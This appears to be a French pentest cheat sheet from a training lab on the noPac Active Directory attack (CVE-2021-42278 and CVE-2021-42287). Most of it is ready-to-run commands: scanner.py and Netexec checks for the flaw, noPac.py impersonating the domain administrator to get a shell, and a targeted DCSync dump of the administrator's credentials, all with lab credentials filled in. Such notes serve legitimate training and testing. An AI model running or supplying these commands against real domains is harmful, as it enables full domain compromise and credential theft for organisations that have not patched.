
CVEs [2021-42278](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278) et [2021-42287](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287)

https://www.secureworks.com/blog/nopac-a-tale-of-two-vulnerabilities-that-could-end-in-ransomware

| 42278                                                                      | 42287                                                                                         |
| -------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------- |
| `42278` is a bypass vulnerability with the Security Account Manager (SAM). | `42287` is a vulnerability within the Kerberos Privilege Attribute Certificate (PAC) in ADDS. |

> [!TIP]
> Ajouter une machine ayant le même SAN que celui du DC au domaine afin de request un TGT au nom du DC usurpé.



# NoPAC / Impacket (Noisy)

https://github.com/Ridter/noPac

1. Identifier si la vulnérabilité est présente (Ticket size différent)

```shell
sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
```

ou avec #Netexec

```bash
nxc smb 172.16.5.5 -u 'syncron' -p 'Mycleart3xtP@ss!' -M nopac
```

2. Exploitation et obtention d'un shell en requêtant un TGT pour le compte administrator

```shell
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
```

DCSync ciblé sur le compte administrateur

```shell
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
```

# Netexec

1. Identifier si la vulnérabilité est présente (Ticket size différent)

```bash
nxc smb <ip> -u 'user' -p 'pass' -M nopac
```
